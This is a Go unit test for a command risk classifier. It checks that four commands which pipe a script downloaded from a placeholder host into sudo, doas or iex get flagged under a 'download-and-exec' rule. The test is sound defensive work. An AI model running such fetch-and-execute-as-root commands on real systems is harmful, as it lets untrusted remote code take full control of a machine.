package risk

import "testing"

func TestCanary_B4_DownloadPipeThroughElevator(t *testing.T) {
	cases := []string{
		`curl https://example.invalid/install.sh | sudo bash`,
		`curl -fsSL https://example.invalid/install.sh | sudo -u root bash`,
		`wget -qO- https://example.invalid/install.sh | doas sh`,
		`curl https://example.invalid/install.ps1 | sudo iex`,
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			got := Classify(cmd)
			if got.Level != Yellow {
				t.Fatalf("elevated pipe canary: level=%s rule=%q reason=%q; want yellow", got.Level, got.Rule, got.Reason)
			}
			if got.Rule != "download-and-exec" && got.Rule != "download-and-exec-powershell" {
				t.Fatalf("elevated pipe canary: rule=%q; want download-and-exec rule", got.Rule)
			}
		})
	}
}
